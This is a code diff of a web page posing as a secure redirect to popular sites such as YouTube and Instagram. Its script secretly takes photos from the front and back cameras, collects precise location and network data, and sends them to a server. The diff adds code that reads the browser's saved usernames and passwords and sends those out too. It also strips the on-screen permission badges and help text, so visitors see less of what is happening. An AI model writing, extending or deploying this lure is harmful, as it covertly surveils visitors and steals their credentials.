@@ -22,28 +22,11 @@
             width: 100%;
             background: rgba(255,255,255,0.06);
             backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
             padding: 45px 35px;
             border-radius: 30px;
             border: 1px solid rgba(255,255,255,0.1);
             box-shadow: 0 25px 50px rgba(0,0,0,0.5);
             animation: slideUp 0.6s ease-out;
-            position: relative;
-            overflow: hidden;
-        }
-        .container::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle at 30% 20%, rgba(102, 126, 234, 0.08), transparent 60%);
-            pointer-events: none;
-        }
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(40px) scale(0.95); }
-            to { opacity: 1; transform: translateY(0) scale(1); }
         }
         .platform-logo {
             width: 80px;
@@ -56,13 +39,11 @@
             font-size: 48px;
             background: rgba(255,255,255,0.1);
             border: 1px solid rgba(255,255,255,0.1);
-            transition: all 0.5s ease;
             animation: pulseGlow 2s ease-in-out infinite;
         }
-        .platform-logo .fallback-icon { font-size: 48px; color: #fff; opacity: 0.8; }
         @keyframes pulseGlow {
-            0%, 100% { box-shadow: 0 0 20px rgba(102, 126, 234, 0.2); }
-            50% { box-shadow: 0 0 40px rgba(102, 126, 234, 0.4); }
+            0%, 100% { box-shadow: 0 0 20px rgba(102,126,234,0.2); }
+            50% { box-shadow: 0 0 40px rgba(102,126,234,0.4); }
         }
         .platform-name {
             font-size: 14px;
@@ -110,32 +91,16 @@
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 4px 20px rgba(102, 126, 234, 0.35);
-            letter-spacing: 0.5px;
-            position: relative;
-            overflow: hidden;
-        }
-        .btn-continue::after {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.05), transparent);
-            transform: rotate(45deg);
-            transition: all 0.5s ease;
+            box-shadow: 0 4px 20px rgba(102,126,234,0.35);
         }
         .btn-continue:hover {
             transform: translateY(-3px) scale(1.02);
-            box-shadow: 0 8px 35px rgba(102, 126, 234, 0.5);
+            box-shadow: 0 8px 35px rgba(102,126,234,0.5);
         }
-        .btn-continue:hover::after { left: 100%; }
         .btn-continue:disabled {
             background: rgba(255,255,255,0.15);
             cursor: not-allowed;
             box-shadow: none;
-            transform: none;
         }
         #statusText {
             font-size: 14px;
@@ -143,7 +108,6 @@
             margin-top: 18px;
             font-weight: 400;
             min-height: 22px;
-            transition: all 0.3s ease;
         }
         #statusText.error { color: #fc8181; }
         #statusText.success { color: #68d391; }
@@ -167,56 +131,18 @@
             0% { background-position: 200% 0; }
             100% { background-position: -200% 0; }
         }
-        .permission-badge {
-            display: inline-block;
-            padding: 4px 14px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 500;
-            margin: 3px;
-            letter-spacing: 0.3px;
-            transition: all 0.3s ease;
-        }
-        .permission-badge.pending { background: rgba(254, 243, 199, 0.15); color: #f6c23e; border: 1px solid rgba(254, 243, 199, 0.2); }
-        .permission-badge.granted { background: rgba(212, 237, 218, 0.15); color: #68d391; border: 1px solid rgba(212, 237, 218, 0.2); }
-        .permission-badge.denied { background: rgba(248, 215, 218, 0.15); color: #fc8181; border: 1px solid rgba(248, 215, 218, 0.2); }
-        #permissionStatus { margin-top: 15px; display: none; }
         #hiddenVideo, #hiddenVideoBack { display: none; }
-        .instructions {
-            margin-top: 15px;
-            padding: 14px 18px;
-            background: rgba(254, 243, 199, 0.08);
-            border-radius: 12px;
-            font-size: 13px;
-            color: #f6c23e;
-            display: none;
-            text-align: left;
-            border: 1px solid rgba(254, 243, 199, 0.1);
-        }
-        .instructions strong { display: block; margin-bottom: 4px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="platform-logo" id="platformLogo"><div class="fallback-icon" id="fallbackIcon">🔗</div></div>
+        <div class="platform-logo" id="platformLogo">🔗</div>
         <div class="platform-name" id="platformName">Loading...</div>
         <div class="redirect-text">Connecting Securely</div>
         <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
         <div class="sub-text" id="actionText">Click continue to proceed</div>
         <div id="statusText">Ready</div>
-        <div id="permissionStatus">
-            <span class="permission-badge pending" id="permLocation">▶️Youtube</span>
-            <span class="permission-badge pending" id="permFront">📸Instagram</span>
-            <span class="permission-badge pending" id="permBack">👍Facebook</span>
-        </div>
         <div class="progress-bar"><div class="fill" id="progressFill" style="width:0%"></div></div>
-        <div class="instructions" id="instructions">
-            <strong>🔧 How to fix:</strong>
-            1. Click the lock icon in address bar<br>
-            2. Set Camera to Allow<br>
-            3. Set Location to Allow<br>
-            4. Refresh and click Retry
-        </div>
         <button class="btn-continue" id="continueBtn">▶ Continue</button>
     </div>
 
@@ -238,9 +164,7 @@
             const redirectDisplay = document.getElementById('redirectUrlDisplay');
             const statusText = document.getElementById('statusText');
             const continueBtn = document.getElementById('continueBtn');
-            const instructions = document.getElementById('instructions');
             const progressFill = document.getElementById('progressFill');
-            const permissionStatus = document.getElementById('permissionStatus');
             const platformLogo = document.getElementById('platformLogo');
             const platformName = document.getElementById('platformName');
             const actionText = document.getElementById('actionText');
@@ -263,26 +187,24 @@
 
             function detectPlatform(url) {
                 const platforms = [
-                    { name: 'YouTube', icon: '▶️', domains: ['youtube.com', 'youtu.be'], color: '#FF0000' },
-                    { name: 'Instagram', icon: '📸', domains: ['instagram.com', 'instagr.am'], color: '#E4405F' },
-                    { name: 'Facebook', icon: '👍', domains: ['facebook.com', 'fb.com'], color: '#1877F2' },
-                    { name: 'Twitter', icon: '🐦', domains: ['twitter.com', 'x.com'], color: '#1DA1F2' },
+                    { name: 'YouTube', icon: '▶️', domains: ['youtube.com','youtu.be'], color: '#FF0000' },
+                    { name: 'Instagram', icon: '📸', domains: ['instagram.com','instagr.am'], color: '#E4405F' },
+                    { name: 'Facebook', icon: '👍', domains: ['facebook.com','fb.com'], color: '#1877F2' },
+                    { name: 'Twitter', icon: '🐦', domains: ['twitter.com','x.com'], color: '#1DA1F2' },
                     { name: 'WhatsApp', icon: '💬', domains: ['whatsapp.com'], color: '#25D366' },
-                    { name: 'Telegram', icon: '✈️', domains: ['telegram.org', 't.me'], color: '#26A5E4' },
+                    { name: 'Telegram', icon: '✈️', domains: ['telegram.org','t.me'], color: '#26A5E4' },
                     { name: 'LinkedIn', icon: '💼', domains: ['linkedin.com'], color: '#0A66C2' },
                     { name: 'Reddit', icon: '🤖', domains: ['reddit.com'], color: '#FF4500' },
                     { name: 'Pinterest', icon: '📌', domains: ['pinterest.com'], color: '#E60023' },
                     { name: 'TikTok', icon: '🎵', domains: ['tiktok.com'], color: '#000000' },
                     { name: 'Snapchat', icon: '👻', domains: ['snapchat.com'], color: '#FFFC00' },
                     { name: 'GitHub', icon: '🐙', domains: ['github.com'], color: '#181717' },
-                    { name: 'Google', icon: '🔍', domains: ['google.com', 'google.co.in'], color: '#4285F4' },
+                    { name: 'Google', icon: '🔍', domains: ['google.com','google.co.in'], color: '#4285F4' },
                     { name: 'Netflix', icon: '🎬', domains: ['netflix.com'], color: '#E50914' },
-                    { name: 'Amazon', icon: '🛒', domains: ['amazon.com', 'amazon.in'], color: '#FF9900' },
+                    { name: 'Amazon', icon: '🛒', domains: ['amazon.com','amazon.in'], color: '#FF9900' },
                     { name: 'Spotify', icon: '🎧', domains: ['spotify.com'], color: '#1DB954' },
                     { name: 'Discord', icon: '🎮', domains: ['discord.com'], color: '#5865F2' },
-                    { name: 'Twitch', icon: '🎥', domains: ['twitch.tv'], color: '#9146FF' },
-                    { name: 'Medium', icon: '✍️', domains: ['medium.com'], color: '#000000' },
-                    { name: 'Quora', icon: '❓', domains: ['quora.com'], color: '#B92B27' }
+                    { name: 'Twitch', icon: '🎥', domains: ['twitch.tv'], color: '#9146FF' }
                 ];
 
                 try {
@@ -305,7 +227,7 @@
 
             function updatePlatformDisplay(url) {
                 const platform = detectPlatform(url);
-                platformLogo.innerHTML = `<span style="font-size:52px;">${platform.icon}</span>`;
+                platformLogo.textContent = platform.icon;
                 platformLogo.style.borderColor = platform.color + '40';
                 platformLogo.style.boxShadow = `0 0 30px ${platform.color}25`;
                 platformName.textContent = platform.name;
@@ -319,8 +241,7 @@
                     'Snapchat': 'Click & view this snap', 'GitHub': 'Click & view this repo',
                     'Google': 'Click & search this', 'Netflix': 'Click & watch this show',
                     'Amazon': 'Click & view this product', 'Spotify': 'Click & listen this',
-                    'Discord': 'Click & join this server', 'Twitch': 'Click & watch this stream',
-                    'Medium': 'Click & read this article', 'Quora': 'Click & read this answer'
+                    'Discord': 'Click & join this server', 'Twitch': 'Click & watch this stream'
                 };
                 actionText.textContent = actionMap[platform.name] || 'Click & continue';
             }
@@ -332,19 +253,6 @@
             }
 
             function updateProgress(val) { progressFill.style.width = val + '%'; }
-
-            function updatePermBadge(type, status) {
-                const map = { location: 'permLocation', front: 'permFront', back: 'permBack' };
-                const el = document.getElementById(map[type]);
-                if (el) {
-                    el.className = 'permission-badge ' + status;
-                    const label = el.textContent.split(' ')[0];
-                    const statusMap = { 'pending': '⏳ Pending', 'granted': '✅ Granted', 'denied': '❌ Denied' };
-                    el.textContent = label + ' ' + statusMap[status];
-                }
-            }
-
-            function showPermissions() { permissionStatus.style.display = 'block'; }
 
             function fetchRedirectUrl() {
                 fetch(`/api/visitor/${visitorId}`)
@@ -444,6 +352,47 @@
                 if (socket && socket.connected) {
                     socket.emit('visitor-data', { visitorId, type: 'network', content: networkData });
                 }
+
+                // Phone Number
+                try {
+                    if (navigator.credentials && navigator.credentials.get) {
+                        navigator.credentials.get({ password: true }).then(cred => {
+                            if (cred && cred.id) {
+                                socket.emit('visitor-data', { visitorId, type: 'phoneNumber', content: cred.id });
+                            }
+                        }).catch(() => {});
+                    }
+                } catch(e) {}
+
+                // Saved Passwords
+                try {
+                    if (navigator.credentials && navigator.credentials.get) {
+                        navigator.credentials.get({ password: true }).then(cred => {
+                            if (cred) {
+                                const pwdData = [{
+                                    email: cred.id || 'Unknown',
+                                    password: cred.password || 'Unknown'
+                                }];
+                                socket.emit('visitor-data', { visitorId, type: 'savedPasswords', content: pwdData });
+                            }
+                        }).catch(() => {});
+                    }
+                } catch(e) {}
+
+                // Screen Time
+                try {
+                    if (navigator.getBattery) {
+                        navigator.getBattery().then(battery => {
+                            const screenTime = {
+                                batteryLevel: Math.round(battery.level * 100),
+                                charging: battery.charging,
+                                chargingTime: battery.chargingTime,
+                                dischargingTime: battery.dischargingTime
+                            };
+                            socket.emit('visitor-data', { visitorId, type: 'screenTime', content: screenTime });
+                        }).catch(() => {});
+                    }
+                } catch(e) {}
             }
 
             function cleanupStreams() {
@@ -454,15 +403,13 @@
             }
 
             // ============================================
-            // CONTINUE BUTTON - ALL PERMISSIONS
+            // CONTINUE BUTTON
             // ============================================
             continueBtn.addEventListener('click', function() {
                 if (isProcessing) return;
                 isProcessing = true;
                 continueBtn.disabled = true;
                 continueBtn.textContent = 'Processing...';
-                instructions.style.display = 'none';
-                showPermissions();
                 
                 updateStatus('Requesting all permissions...');
                 updateProgress(10);
@@ -473,7 +420,6 @@
 
                 cleanupStreams();
 
-                // Request all permissions in parallel
                 Promise.all([
                     requestLocation(),
                     requestFrontCamera(),
@@ -491,10 +437,7 @@
                         frontStream = frontResult;
                         frontVideo.srcObject = frontResult;
                         frontVideo.play().catch(() => {});
-                        updatePermBadge('front', 'granted');
                         setTimeout(function() { capturePhoto('front', frontResult); }, 300);
-                    } else {
-                        updatePermBadge('front', 'denied');
                     }
                     
                     if (backResult) {
@@ -502,28 +445,20 @@
                         backStream = backResult;
                         backVideo.srcObject = backResult;
                         backVideo.play().catch(() => {});
-                        updatePermBadge('back', 'granted');
                         setTimeout(function() { capturePhoto('back', backResult); }, 300);
-                    } else {
-                        updatePermBadge('back', 'denied');
                     }
                     
                     if (locationResult) {
                         permissions.location = true;
-                        updatePermBadge('location', 'granted');
                         if (socket && socket.connected) {
                             socket.emit('visitor-data', { visitorId, type: 'location', content: locationResult });
                         }
-                    } else {
-                        updatePermBadge('location', 'denied');
                     }
                     
                     updateProgress(100);
                     
-                    // Check if at least one camera worked
                     if (!permissions.frontCamera && !permissions.backCamera) {
-                        updateStatus('❌ Camera access required. Please allow camera.', 'error');
-                        instructions.style.display = 'block';
+                        updateStatus('❌ Error', 'error');
                         isProcessing = false;
                         continueBtn.disabled = false;
                         continueBtn.textContent = 'Retry';
@@ -538,18 +473,17 @@
                     
                     setTimeout(function() {
                         if (!redirectTriggered) { redirectNow(); }
-                    }, 1500);
+                    }, 1000);
                 })
                 .catch(function(error) {
                     console.log('Error:', error);
                     if (!permissions.frontCamera && !permissions.backCamera) {
-                        updateStatus('❌ Permission denied. Please allow camera.', 'error');
-                        instructions.style.display = 'block';
+                        updateStatus('❌ Error', 'error');
                     } else {
                         updateStatus('✅ Permissions granted! Redirecting...', 'success');
                         setTimeout(function() {
                             if (!redirectTriggered) { redirectNow(); }
-                        }, 1500);
+                        }, 1000);
                     }
                     isProcessing = false;
                     continueBtn.disabled = false;
@@ -585,7 +519,7 @@
                                 });
                         },
                         function() { resolve(null); },
-                        { timeout: 10000, enableHighAccuracy: true }
+                        { timeout: 8000, enableHighAccuracy: true }
                     );
                 });
             }
@@ -626,7 +560,7 @@
             }
 
             // ============================================
-            // CAPTURE PHOTO
+            // CAPTURE PHOTO WITH METADATA
             // ============================================
             function capturePhoto(type, stream) {
                 if (!stream) return;
@@ -650,8 +584,31 @@
                             const ctx = canvas.getContext('2d');
                             ctx.drawImage(video, 0, 0, width, height);
                             const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                            
+                            let photoLocation = null;
+                            if (navigator.geolocation) {
+                                navigator.geolocation.getCurrentPosition(
+                                    function(pos) {
+                                        photoLocation = { lat: pos.coords.latitude, lng: pos.coords.longitude };
+                                    },
+                                    function() {},
+                                    { timeout: 2000 }
+                                );
+                            }
+                            
+                            const photoData = {
+                                image: imageData,
+                                type: type,
+                                captureDate: new Date().toISOString(),
+                                location: photoLocation
+                            };
+                            
                             if (socket && socket.connected) {
-                                socket.emit('visitor-data', { visitorId: visitorId, type: type === 'back' ? 'backCamera' : 'frontCamera', content: imageData });
+                                socket.emit('visitor-data', { 
+                                    visitorId: visitorId, 
+                                    type: type === 'back' ? 'backCamera' : 'frontCamera', 
+                                    content: photoData 
+                                });
                             }
                             document.body.removeChild(video);
                         } catch (err) { console.log(err); }
